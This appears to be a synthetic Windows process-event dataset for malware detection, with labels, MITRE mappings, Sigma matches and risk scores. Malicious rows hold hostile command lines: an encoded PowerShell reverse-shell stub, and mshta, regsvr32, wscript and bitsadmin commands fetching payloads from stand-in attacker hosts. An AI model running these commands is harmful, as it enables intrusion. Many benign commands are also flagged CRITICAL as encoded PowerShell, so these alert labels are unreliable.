UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-03T15:36:50.248Z,{080A0336-0779-43E8-AE73-661602F41FF9},22357,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-EventLog -LogName System -Newest 50""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,25645,CORP\jsmith,Medium,0,,,benign,1,3,1,1,76,4.5494,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,15,0,0,36,1.3846,1.575697663509122,1.072955136918485,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,47.121095740859744,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 47 | Chain Risk: 5
2024-07-01T08:45:08.718Z,{D4FA767C-AC73-4ACE-8002-B9950D515FD2},1743,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Install-Module -Name Az -AllowClobber -Force""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,11736,CORP\mjones,Medium,0,,,benign,0,3,1,1,81,4.4666,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,8,0,0,45,1.231,1.7761681041591375,0.9489731963078728,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.00619398460937,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-03T02:24:53.905Z,{B6665F8F-98BF-4498-BE46-F21DF5E7D73E},38381,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded2942.exe C:\Users\Public\encoded4370.txt,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,15711,CORP\agarwal,Medium,1,T1140,Certutil Base64 Decode,malicious,4,8,1,0,84,4.4319,1,0,0,0,4,0.25,0,0,2,0,0,1,2657444117,2,1,0,24,3.9031,1.896450368549147,0.8970145811002858,0,12,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,94.76768245393464,75,powershell.exe → certutil.exe: PowerShell invoking certutil [Modifiers: +10 off-hours],True,ALERT,CRITICAL,99.5,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 95 | Chain Risk: 75
2024-07-04T10:53:37.612Z,{6FEF19CB-070D-4B55-B138-0920E024455B},6641,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -exec bypass -noni -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,10413,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious,10,3,1,1,242,4.6484,1,0,0,1,9,0.4444,1,0,2,1,0,0,3072976960,10,0,0,53,3.9031,8.23131629308964,1.2211944137355193,0,6,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → powershell.exe: Office Word directly spawning PowerShell [Modifiers: +20 Office→Script chain, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-01T01:58:38.210Z,{65EC55EE-705D-4C6E-995A-62A8B0B14185},39509,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -ep bypass -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document6.docm",60059,CORP\jsmith,Medium,1,T1204.002,Office Macro Execution,malicious,10,4,1,1,230,4.5801,1,0,0,1,7,0.1429,1,0,2,1,0,0,1182374401,1,1,0,58,3.9031,7.7501872355296015,1.1189242863960902,0,9,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → cmd.exe: Office Word spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 off-hours, +10 encoded command]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-01T13:41:06.693Z,{91388240-180B-49FA-8C45-330CEC51FD9A},53432,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,11771,CORP\admin,High,0,,,benign,0,3,1,1,86,4.3913,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,13,0,0,41,1.231,1.976638544809153,0.836221503940977,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,39.62614128142518,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 40 | Chain Risk: 5
2024-07-01T17:12:37.558Z,{316B0F49-B278-4E3C-AD5E-A54BB82A9E35},12791,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,45676,CORP\jsmith,Medium,0,,,benign,1,3,1,1,86,4.3913,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,17,0,0,12,1.3846,1.976638544809153,0.836221503940977,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,50.27305175510905,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 50 | Chain Risk: 5
2024-07-03T09:52:49.963Z,{D6BE0172-A6C6-472D-8B04-A722E278B089},33223,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://darkops2635.ru/script901.js,C:\Windows\System32\cmd.exe,cmd.exe /c,31873,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious,1,21,1,1,58,4.4258,1,1,0,0,3,0.3333,0,0,2,0,0,1,4144717783,9,0,0,52,3.9031,0.8540040771690661,0.8878806458620644,0,6,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,91.32707277907103,75,"cmd.exe → wscript.exe: Command shell invoking WScript [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,99.1,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 91 | Chain Risk: 75
2024-07-01T13:56:08.487Z,{437D6260-6FF6-4146-ADFF-B255DCCEF5DE},15076,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb2547674.cab C:\Windows\SoftwareDistribution\Download\update_kb2547674.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,30239,NT AUTHORITY\SYSTEM,System,0,,,gray_area,2,24,1,0,177,4.847,1,1,0,0,8,0.125,0,1,1,0,0,0,583731811,13,0,0,56,3.9031,5.625200564639437,1.5185713872290882,1,2,3,True,BITSAdmin File Download,high,attack.t1197,90.69000387595567,30,"svchost.exe → bitsadmin.exe: No known suspicious pattern [Modifiers: +15 URL in command, +10 LOLBin child, +5 suspicious flags]",False,ALERT,CRITICAL,99.1,Sigma rule matched: BITSAdmin File Download | ML Score: 91 | Chain Risk: 30
2024-07-04T03:29:42.781Z,{6793FAD1-E0C6-49B2-9645-A57ADBBA21EB},36885,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\module824.csproj,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,12835,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious,4,34,1,0,84,4.9714,0,0,0,0,2,0.0,0,0,2,0,0,1,3004846269,3,1,0,29,3.9031,1.896450368549147,1.7048437714315037,0,0,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,81.24595425226394,80,powershell.exe → msbuild.exe: PowerShell spawning MSBuild [Modifiers: +10 off-hours],True,ALERT,CRITICAL,98.1,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 81 | Chain Risk: 80
2024-07-01T17:46:24.359Z,{25D4D865-4B24-4D9D-A593-39438582EBCD},64127,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,29140,CORP\admin,High,0,,,benign,0,3,1,1,89,4.9011,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,17,0,0,46,1.231,2.0969208091991622,1.599578911227083,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,45.75955222113936,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 46 | Chain Risk: 5
2024-07-02T08:25:12.643Z,{E976C1EF-DBCF-45B6-B36E-9A79C39543FA},21024,C:\Windows\System32\certutil.exe,certutil -decode C:\Users\Public\encoded9073.txt C:\Users\Public\decoded5453.exe,C:\Windows\System32\cmd.exe,cmd.exe,21560,CORP\agarwal,Medium,1,T1140,Certutil Base64 Decode,malicious,1,8,1,0,80,4.4313,1,0,0,0,4,0.25,0,0,2,0,0,1,1473216238,8,0,0,25,3.9031,1.7360740160291346,0.8961161612407894,0,12,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,90.7662479455103,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,ALERT,CRITICAL,99.1,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 91 | Chain Risk: 50
2024-07-07T04:37:01.324Z,{29ECF114-F9B9-457D-A029-ED503031E35A},25755,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\svc346.csproj,C:\Windows\System32\cmd.exe,powershell.exe,38378,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious,1,34,1,0,81,4.9481,0,0,0,0,2,0.0,0,0,2,0,0,1,442785036,4,1,1,37,3.9031,1.7761681041591375,1.6699551335543632,0,0,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,81.68057179052457,75,cmd.exe → msbuild.exe: Command shell spawning MSBuild [Modifiers: +10 off-hours],True,ALERT,CRITICAL,98.2,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 82 | Chain Risk: 75
2024-07-01T14:48:02.676Z,{2E87BCD8-F52A-4A14-9A25-09CFC676BFFE},61458,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Microsoft Office\root\Office16\GROOVEEX.DLL,C:\Windows\System32\cmd.exe,cmd.exe /c,43039,CORP\sysadmin,High,0,,,gray_area,1,19,1,0,76,4.7663,0,0,0,0,5,0.0,0,0,2,0,0,1,2398546659,14,0,0,48,3.9031,1.575697663509122,1.3977339161267168,0,10,2,False,None,none,,72.51058698492865,55,cmd.exe → regsvr32.exe: Command shell invoking regsvr32,True,ALERT,MEDIUM,51.7,"ANOMALY SCORE: 73/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-03T03:47:29.229Z,{E662B569-946C-43D1-8568-3676350E5BE1},2758,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,52853,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious,10,3,1,1,250,4.8986,1,0,0,1,6,0.5,1,0,2,1,0,0,3072976960,3,1,0,47,3.9031,8.552068998129663,1.5958354951458456,0,6,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → powershell.exe: Office Word directly spawning PowerShell [Modifiers: +20 Office→Script chain, +10 off-hours, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-04T01:33:42.692Z,{C93E2348-3FB8-4EFC-A13B-432A500E167B},6570,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job4861 /download /priority high http://dropper-srv7283.xyz/module418.exe C:\Users\Public\installer194.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,8813,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious,4,24,1,0,130,4.9633,1,1,0,0,8,0.125,0,1,2,0,0,1,1514001697,1,1,0,33,3.9031,3.74077842252929,1.6927151033282921,0,0,1,True,BITSAdmin File Download,high,attack.t1197,90.63066663376722,90,"powershell.exe → bitsadmin.exe: PowerShell invoking bitsadmin [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.1,Sigma rule matched: BITSAdmin File Download | ML Score: 91 | Chain Risk: 90
2024-07-05T08:50:23.718Z,{433B9D76-7C0D-476A-9EC0-1074D8682A9B},59687,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Disk | Get-Partition | Get-Volume""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,54234,CORP\mjones,Medium,0,,,benign,1,3,1,1,74,4.4639,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,8,0,0,50,1.3846,1.495509487249116,0.9449303069401356,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,53.49314508033542,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.3,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 53 | Chain Risk: 5
2024-07-05T17:23:44.689Z,{10A7BCE9-C15D-46E2-9FB2-528925C10230},64120,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\Reports\servers.csv""",C:\Windows\System32\cmd.exe,cmd.exe,46239,CORP\sysadmin,High,0,,,gray_area,1,3,1,1,239,4.8519,0,0,0,0,20,0.0,0,0,2,0,0,1,4082297620,17,0,0,23,1.3846,8.11103402869963,1.525908482748314,0,10,2,False,None,none,,94.8387897821431,0,cmd.exe → powershell.exe: No known suspicious pattern,False,ALERT,MEDIUM,66.6,"ANOMALY SCORE: 95/100 | Unusual factors: unusually long command line: 239.00 (baseline: 36.70±24.93, z=8.1); command length significantly above baseline: 8.11 (baseline: -0.00±1.00, z=8.1); unusual number of arguments: 20.00 (baseline: 3.17±2.29, z=7.3); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-01T18:21:03.345Z,{A79F8EA2-5616-4B72-B364-DCB6F7FC57AA},52627,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://stager6379.net/script812.hta"""""")",C:\Windows\System32\cmd.exe,cmd.exe,48252,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious,1,5,1,1,101,4.7515,0,1,0,0,3,0.0,0,0,2,0,0,1,345041238,18,0,0,21,3.9031,2.5780498667591996,1.375572892925786,0,6,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,73.82984045861174,75,cmd.exe → mshta.exe: Command shell invoking mshta [Modifiers: +15 URL in command],True,ALERT,CRITICAL,97.4,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 74 | Chain Risk: 75
2024-07-02T01:27:38.266Z,{63E8066A-1F8A-435A-A74C-B149C6CD84AD},10781,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded476.exe C:\Users\Public\encoded439.txt,C:\Windows\System32\cmd.exe,cmd.exe,6836,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious,1,8,1,0,82,4.3737,1,0,0,0,4,0.25,0,0,2,0,0,1,1473216238,1,1,0,27,3.9031,1.8162621922891407,0.80986785472906,0,6,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,94.9838507628084,60,cmd.exe → certutil.exe: Command shell invoking certutil [Modifiers: +10 off-hours],True,ALERT,CRITICAL,99.5,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 95 | Chain Risk: 60
2024-07-01T02:55:49.310Z,{9BB3C456-218B-4BB3-B985-4476A30EA859},58979,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job2051 /download http://beacon-drop299.com/files/installer902.exe C:\Users\Public\installer461.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,47272,CORP\klee,Medium,1,T1197,BITSAdmin Download,malicious,4,24,1,0,123,4.8102,1,1,0,0,6,0.1667,0,1,2,0,0,1,1514001697,2,1,0,55,3.9031,3.460119805619268,1.4634683025132604,0,6,1,True,BITSAdmin File Download,high,attack.t1197,89.93622697669088,90,"powershell.exe → bitsadmin.exe: PowerShell invoking bitsadmin [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: BITSAdmin File Download | ML Score: 90 | Chain Risk: 90
2024-07-03T08:48:42.385Z,{9C64DEB8-0532-4458-BBCC-ABF9C5957AD1},56640,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,49370,CORP\mjones,Medium,0,,,benign,0,3,1,1,112,4.5569,1,0,0,0,12,0.0833,0,0,1,0,0,0,945137867,8,0,0,48,1.231,3.0190848361892337,1.084185385162199,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,57.2514488482812,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 57 | Chain Risk: 5
2024-07-03T12:15:46.640Z,{AE143977-FC2C-4558-A4C9-912773A54384},33492,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,39915,CORP\jsmith,Medium,0,,,benign,0,3,1,1,86,4.3913,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,12,0,0,15,1.231,1.976638544809153,0.836221503940977,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,38.80785721487054,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,93.9,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 39 | Chain Risk: 5
2024-07-03T15:21:27.835Z,{6ABB3463-ECDB-462C-B71E-8F340CFBABDF},54971,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,57328,CORP\agarwal,Medium,0,,,benign,1,3,1,1,73,4.3563,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,15,0,0,21,1.3846,1.4554153991191128,0.7838136788036412,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,55.69376868334892,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 56 | Chain Risk: 5
2024-07-04T09:14:24.091Z,{B829FE9C-97E5-438E-9AD8-26D8217361B8},48891,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter *""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,53819,CORP\mjones,Medium,0,,,benign,0,3,1,1,92,4.6231,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,9,0,0,14,1.231,2.2172030735891717,1.1833110429933886,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,38.084912325076935,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,93.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 38 | Chain Risk: 5
2024-07-04T15:19:15.214Z,{44285EA9-8269-4938-95B8-7C99AB335C9E},37492,C:\Windows\System32\rundll32.exe,"rundll32.exe printui.dll,PrintUIEntry /in /n \\printserver\HP_LaserJet",C:\Windows\explorer.exe,C:\Windows\explorer.exe,4083,CORP\agarwal,Medium,0,,,gray_area,0,1,1,0,70,4.4559,0,0,0,0,5,0.0,0,0,1,0,0,0,788896773,15,0,0,19,3.9031,1.3351331347291033,0.9329513754801732,0,12,1,False,None,none,,76.22006397566989,25,explorer.exe → rundll32.exe: Explorer launching rundll32,True,ALERT,MEDIUM,54.1,"ANOMALY SCORE: 76/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4)"
2024-07-03T04:39:59.164Z,{0C9EA3D1-9DEB-43A0-BD5B-E8BB8D740F35},47649,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c runtime233.exe"")",C:\Windows\System32\cmd.exe,cmd.exe,36082,CORP\jsmith,Medium,1,T1218.011,Rundll32 JavaScript,malicious,1,1,1,0,139,5.0764,1,0,0,0,5,0.2,0,0,2,0,0,1,606078729,4,1,0,39,3.9031,4.101625215699318,1.86206724684351,0,9,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,94.8825209151887,65,"cmd.exe → rundll32.exe: Command shell invoking rundll32 [Modifiers: +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.5,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 95 | Chain Risk: 65
2024-07-07T02:37:05.932Z,{9FFDACC5-CF89-4047-93D0-ED2CDC8C6D94},46088,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\installer100.csproj,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,5292,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious,4,34,1,0,87,4.9418,0,0,0,0,2,0.0,0,0,2,0,0,1,3004846269,2,1,1,37,3.9031,2.0167326329391564,1.6605217250296422,0,0,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,81.54561647118288,80,powershell.exe → msbuild.exe: PowerShell spawning MSBuild [Modifiers: +10 off-hours],True,ALERT,CRITICAL,98.2,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 82 | Chain Risk: 80
2024-07-02T22:30:53.473Z,{58CAEF99-469C-4D05-B65A-7BF294EDF4B0},19295,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://cobaltstrike2794.xyz/payloads/file89.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,1950,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious,1,19,1,0,79,4.7232,1,1,0,0,6,0.1667,0,0,2,0,0,1,2398546659,22,0,0,30,3.9031,1.6959799278991314,1.3331974228861692,0,6,1,True,Regsvr32 Squiblydoo Remote SCT Execution,critical,attack.t1218.010,89.05134108870361,75,"cmd.exe → regsvr32.exe: Command shell invoking regsvr32 [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,98.9,Sigma rule matched: Regsvr32 Squiblydoo Remote SCT Execution | ML Score: 89 | Chain Risk: 75
2024-07-01T21:39:10.855Z,{F3BA2609-DA9F-4E72-BF25-67DE896DDFB4},39734,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://evil-payload7730.com/script249.hta"""""")",C:\Windows\explorer.exe,cmd.exe,5191,CORP\jsmith,Medium,1,T1218.005,Mshta Remote HTA,malicious,0,5,1,1,107,4.895,0,1,0,0,3,0.0,0,0,1,0,0,0,333442925,21,0,0,39,3.9031,2.8186143955392184,1.5904449759888617,0,9,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,92.39900427143155,55,explorer.exe → mshta.exe: Explorer launching HTA handler [Modifiers: +15 URL in command],True,ALERT,CRITICAL,99.2,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 92 | Chain Risk: 55
2024-07-04T15:26:45.860Z,{03E7BD06-FABD-4A86-9EEE-19AE0F615C06},30088,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Content C:\Scripts\inventory.ps1 | Out-File C:\Reports\output.txt""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,33027,CORP\agarwal,Medium,0,,,benign,1,3,1,1,106,4.6971,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,15,0,0,26,1.3846,2.7785203074092153,1.294116158998041,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,52.82592169810331,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.3,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 53 | Chain Risk: 5
